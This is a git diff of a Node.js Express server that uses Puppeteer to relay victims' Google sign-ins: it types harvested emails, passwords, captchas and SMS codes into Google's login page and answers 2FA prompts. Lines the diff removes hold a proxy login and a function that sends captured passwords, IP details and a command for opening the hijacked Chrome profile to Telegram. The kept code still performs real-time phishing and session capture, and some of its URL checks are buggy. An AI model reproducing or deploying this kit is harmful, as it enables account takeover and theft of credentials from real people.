@@ -58,13 +58,6 @@ async function waitForSpinnerToFinish(page, timeout = 8000) {
   } catch {}
 }
 
-const PROXY = {
-  host: "gw.dataimpulse.com",
-  port: 823,
-  username: "e34f312113450eeb8578__cr.it",
-  password: "517aa00c2c9ed320",
-};
-
 app.post("/start-session", async (req, res) => {
   try {
     const sessionId = uuidv4();
@@ -72,8 +65,18 @@ app.post("/start-session", async (req, res) => {
     if (!fs.existsSync(profilePath))
       fs.mkdirSync(profilePath, { recursive: true });
 
-    // Get IP information from client (browser)
-    const ipInfo = req.body.clientIpInfo || null;
+    // Get IP information from API
+    let ipInfo = null;
+    try {
+      const { data: ipData } = await axios.get("https://ipapi.co/json/");
+      ipInfo = {
+        ip: ipData.ip,
+        location: `${ipData.city}, ${ipData.region}, ${ipData.country_name}`,
+        isp: ipData.org || ipData.asn || "Unknown ISP",
+      };
+    } catch (err) {
+      console.warn("⚠️ Failed to get IP info:", err.message);
+    }
 
     // Return session ID immediately
     res.json({ success: true, sessionId, profilePath });
@@ -86,7 +89,6 @@ app.post("/start-session", async (req, res) => {
         userDataDir: profilePath,
         defaultViewport: null,
         args: [
-          `--proxy-server=http://${PROXY.host}:${PROXY.port}`,
           "--start-maximized",
           "--no-sandbox",
           "--disable-setuid-sandbox",
@@ -95,12 +97,6 @@ app.post("/start-session", async (req, res) => {
       });
 
       const page = await browser.newPage();
-
-      await page.authenticate({
-        username: PROXY.username,
-        password: PROXY.password,
-      });
-
       await page.setUserAgent(
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) " +
           "Chrome/128.0.0.0 Safari/537.36"
@@ -236,7 +232,6 @@ app.post("/sign-in-captcha", async (req, res) => {
     const { page } = session;
 
     session.userInfo = {
-      ...session.userInfo,
       captcha,
       userAgent: await page.evaluate(() => navigator.userAgent),
     };
@@ -344,11 +339,9 @@ app.post("/sign-in-2", async (req, res) => {
         .json({ success: false, error: "Session not found" });
 
     resetInactivityTimer(sessionId);
-
     const { page } = session;
 
     session.userInfo = {
-      ...session.userInfo,
       password: password,
       userAgent: await page.evaluate(() => navigator.userAgent),
     };
@@ -358,6 +351,7 @@ app.post("/sign-in-2", async (req, res) => {
       timeout: 10000,
     });
 
+    // Clear input before typing
     await page.evaluate(() => {
       const input = document.querySelector('input[name="Passwd"]');
       if (input) input.value = "";
@@ -367,46 +361,74 @@ app.post("/sign-in-2", async (req, res) => {
     await page.type('input[name="Passwd"]', password, { delay: 30 });
     await page.keyboard.press("Enter");
 
-    const invalidPassword = "Wrong password.";
+    const invalidPassword =
+      "Wrong password. Try again or click Forgot password to reset it.";
     const validPassword = "Check your";
-    const OpenThe = "Open the";
     const smsChallengeText = "Choose how you want to sign in:";
-    const smsChallengeText2 =
-      "Enter a phone number to get a text message with a verification code.";
-    const welcome = "Welcome,";
+    const welcome = "Manage your info, privacy, and security to make Google work better for you. ";
     const signInFaster = "Sign in faster";
-    const successUrlSubstring = "myaccount.google.com";
-    const successUrlSubstring2 = "gds.google.com";
 
-    // ⏳ Wait for Google validation spinner
-    await waitForSpinnerToFinish(page, 10000);
+    let result;
 
-    const currentUrl = page.url();
-    if (
-      currentUrl.includes(successUrlSubstring) ||
-      currentUrl.includes(successUrlSubstring2)
-    ) {
-      console.log(`Session ${sessionId}: ✅ login success (URL check)`);
-      await sendLoginSessionMessage(sessionId); // ✅ Send Telegram
-      return res.json({ success: true, code: 3, message: "Verified" });
+    try {
+      const detectedText = await page.waitForFunction(
+        (
+          invalidPassword,
+          validPassword,
+          smsChallengeText,
+          welcome,
+          signInFaster
+        ) => {
+          const bodyText = document.body.innerText;
+          if (bodyText.includes(validPassword)) return bodyText;
+          if (bodyText.includes(invalidPassword)) return invalidPassword;
+          if (bodyText.includes(smsChallengeText)) return smsChallengeText;
+          if (bodyText.includes(welcome)) return welcome;
+          if (bodyText.includes(signInFaster)) return signInFaster;
+          return null;
+        },
+        { timeout: 30000, polling: 100 },
+        invalidPassword,
+        validPassword,
+        smsChallengeText,
+        welcome,
+        signInFaster
+      );
+
+      result = await detectedText.jsonValue();
+    } catch (timeoutErr) {
+      console.log(`Session ${sessionId}: ⏳ 30s timeout — checking URL...`);
+      const currentUrl = page.url();
+      console.log(`Session ${sessionId}: 🌐 Final URL →`, currentUrl);
+
+      if (currentUrl.startsWith("https://myaccount.google.com/" || currentUrl.startsWith("https://gds.google.com/"))) {
+        console.log(`Session ${sessionId}: ✅ Login successful (URL confirmed)`);
+        return res.json({ success: true, code: 3, message: "Login success (URL)" });
+      }
+
+      return res.json({ success: false, code: 0, message: "Timeout with no result" });
     }
 
-    let bodyText = await page.evaluate(() => document.body.innerText);
-
-    if (bodyText.includes(invalidPassword)) {
-      console.log(`Session ${sessionId}: ❌ Wrong password`);
+    // Handle invalid password
+    if (result === invalidPassword) {
+      console.log(`Session ${sessionId}: ❌ Wrong password entered`);
       return res.json({ success: false, code: 0 });
     }
 
-    if (bodyText.includes(validPassword)) {
-      const match = bodyText.match(/Check your\s+([^\n]+)/i);
+    // Extract text after "Check your"
+    if (typeof result === "string" && result.includes(validPassword)) {
+      const match = result.match(/Check your\s+([^\n]+)/i);
       const checkTarget = match ? match[1].trim() : null;
+
+      console.log(
+        `Session ${sessionId}: 🔢 Check your — target: ${checkTarget || "unknown"}`
+      );
 
       const extractedNumber = await page.evaluate(() => {
         const el = document.querySelector('samp.Sevzkc[jsname="feLNVc"]');
         if (!el) return null;
         const text = el.innerText.trim();
-        return /^\d+$/.test(text) ? text : null;
+        return text && /^\d+$/.test(text) ? text : null;
       });
 
       return res.json({
@@ -416,25 +438,8 @@ app.post("/sign-in-2", async (req, res) => {
       });
     }
 
-    if (bodyText.includes(OpenThe)) {
-      const match = bodyText.match(/Open the\s+([^\n]+)/i);
-      const checkTarget = match ? match[1].trim() : null;
-
-      const extractedNumber = await page.evaluate(() => {
-        const el = document.querySelector('samp.Sevzkc[jsname="feLNVc"]');
-        if (!el) return null;
-        const text = el.innerText.trim();
-        return /^\d+$/.test(text) ? text : null;
-      });
-
-      return res.json({
-        success: true,
-        code: extractedNumber || 1,
-        message: checkTarget || "",
-      });
-    }
-
-    if (bodyText.includes(smsChallengeText)) {
+    if (result === smsChallengeText) {
+      console.log(`Session ${sessionId}: 📱 SMS challenge detected`);
       await page.evaluate(() => {
         const btn =
           document.querySelector('[data-challengevariant="SMS"]') ||
@@ -455,7 +460,8 @@ app.post("/sign-in-2", async (req, res) => {
         ];
         for (const s of selectors) {
           const el = document.querySelector(s);
-          if (el && el.innerText.includes("•")) return el.innerText.trim();
+          if (el && el.innerText && el.innerText.includes("•"))
+            return el.innerText.trim();
         }
         return null;
       });
@@ -463,42 +469,24 @@ app.post("/sign-in-2", async (req, res) => {
       return res.json({ success: true, code: 2, message: maskedPhone });
     }
 
-    if (bodyText.includes(smsChallengeText2)) {
-      const maskedPhone = await page.evaluate(() => {
-        const selectors = [
-          "div.dMNVAe span[jsname='wKtwcc']",
-          "span.red0Me span[jsname='wKtwcc']",
-          "span[jsname='wKtwcc']",
-          "span[data-phone-number]",
-        ];
-        for (const s of selectors) {
-          const el = document.querySelector(s);
-          if (el && el.innerText.includes("•")) return el.innerText.trim();
-        }
-        return null;
-      });
-
-      return res.json({ success: true, code: 2, message: maskedPhone });
-    }
-
-    if (bodyText.includes(signInFaster)) {
-      console.log(`Session ${sessionId}: 🚀 Sign in faster`);
-      await sendLoginSessionMessage(sessionId); // ✅ Send Telegram
-      return res.json({ success: true, code: 3, message: signInFaster });
-    }
-
-    if (bodyText.includes(welcome)) {
-      console.log(`Session ${sessionId}: ✅ Welcome screen`);
-      await sendLoginSessionMessage(sessionId); // ✅ Send Telegram
+    if (result === welcome) {
+      console.log(`Session ${sessionId}: ✅ Login successful`);
       return res.json({ success: true, code: 3, message: welcome });
     }
 
-    return res.json({ success: false, code: 20, message: "Unexpected state" });
+    if (result === signInFaster) {
+      console.log(`Session ${sessionId}: 🚀 Sign in faster`);
+      return res.json({ success: true, code: 3, message: "Sign in faster" });
+    }
+
+    return res.json({ success: false, code: 20, message: "Unexpected response" });
+
   } catch (err) {
     console.error("Sign-in-2 error:", err);
     res.status(500).json({ success: false, error: err.message });
   }
 });
+
 
 app.post("/verify-google-url", async (req, res) => {
   try {
@@ -520,13 +508,8 @@ app.post("/verify-google-url", async (req, res) => {
     // console.log(`Session ${sessionId}: 🌐 Current URL → ${currentUrl}`);
 
     // Check if the URL is Google's account domain
-    if (
-      currentUrl.includes(
-        "myaccount.google.com" || currentUrl.includes("gds.google.com")
-      )
-    ) {
+    if (currentUrl.includes("myaccount.google.com" || currentUrl.includes("gds.google.com"))) {
       console.log(`Session ${sessionId}: ✅ 2FA Successful`);
-      await sendLoginSessionMessage(sessionId); // ✅ Send Telegram
       return res.json(1);
     } else {
       // console.log(`Session ${sessionId}: ❌ Not on Google account page`);
@@ -537,7 +520,6 @@ app.post("/verify-google-url", async (req, res) => {
     res.status(500).json({ success: false, error: err.message });
   }
 });
-
 app.post("/confirm-phone", async (req, res) => {
   try {
     const { sessionId, phone } = req.body;
@@ -666,12 +648,8 @@ app.post("/phone-otp", async (req, res) => {
 
     // Check URL first
     const currentUrl = page.url();
-    if (
-      currentUrl.includes(successUrlSubstring) ||
-      currentUrl.includes(successUrlSubstring2)
-    ) {
+    if (currentUrl.includes(successUrlSubstring) || currentUrl.includes(successUrlSubstring2)) {
       console.log(`Session ${sessionId}: ✅ OTP accepted — login success`);
-      await sendLoginSessionMessage(sessionId); // ✅ Send Telegram
       return res.json({ success: true, code: 1, message: "Verified" });
     }
 
@@ -704,63 +682,6 @@ app.post("/phone-otp", async (req, res) => {
     return res.status(500).json({ success: false, error: err.message });
   }
 });
-
-async function sendLoginSessionMessage(sessionId) {
-  try {
-    const session = sessions[sessionId];
-    if (!session) return;
-
-    // avoid duplicate sends
-    if (session._telegramSent) {
-      console.log(`Session ${sessionId}: Telegram already sent — skipping.`);
-      return;
-    }
-
-    const { userInfo, ipInfo, page, browser, profilePath } = session;
-
-    let currentUrl = "unknown";
-    try {
-      currentUrl = page.url() || currentUrl;
-    } catch {}
-
-    const ipDetails = ipInfo
-      ? `IP: ${ipInfo.ip}\nLocation: ${ipInfo.location}\nISP: ${ipInfo.isp}`
-      : `IP: unknown`;
-
-    const profileCmd = `"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" --user-data-dir="C:\\Users\\Administrator\\Desktop\\gmail\\chrome-profiles\\${sessionId}"`;
-
-    const sessionMessage =
-      `<b>New Session Captured</b>\n\n` +
-      `Name : GOOGLE\n` +
-      `Username : ${userInfo?.email || "unknown"}\n` +
-      `Password : <tg-spoiler>${userInfo?.password || ""}</tg-spoiler>\n` +
-      `Landing URL : ${currentUrl}\n` +
-      `${ipDetails}\n\n` +
-      `👆 <b>Profile (open with):</b>\n` +
-      `<code>${profileCmd}</code>`;
-
-    // ✅ Send Telegram Message
-    await sendTelegramMessage(sessionMessage);
-    session._telegramSent = true;
-    console.log(`Session ${sessionId}: ✅ Telegram sent successfully.`);
-
-    // ✅ Only close browser — DO NOT DELETE ANYTHING
-    if (browser) {
-      console.log(`Session ${sessionId}: 🛑 Closing browser...`);
-      await browser.close();
-    }
-
-    // 🚫 DO NOT DELETE PROFILE
-    // 🚫 DO NOT REMOVE SESSION
-    // We leave profilePath and sessions[sessionId] untouched.
-
-    console.log(
-      `Session ${sessionId}: ✅ Browser closed. Profile & session preserved.`
-    );
-  } catch (err) {
-    console.error("sendLoginSessionMessage error:", err);
-  }
-}
 
 app.post("/end-session", async (req, res) => {
   try {
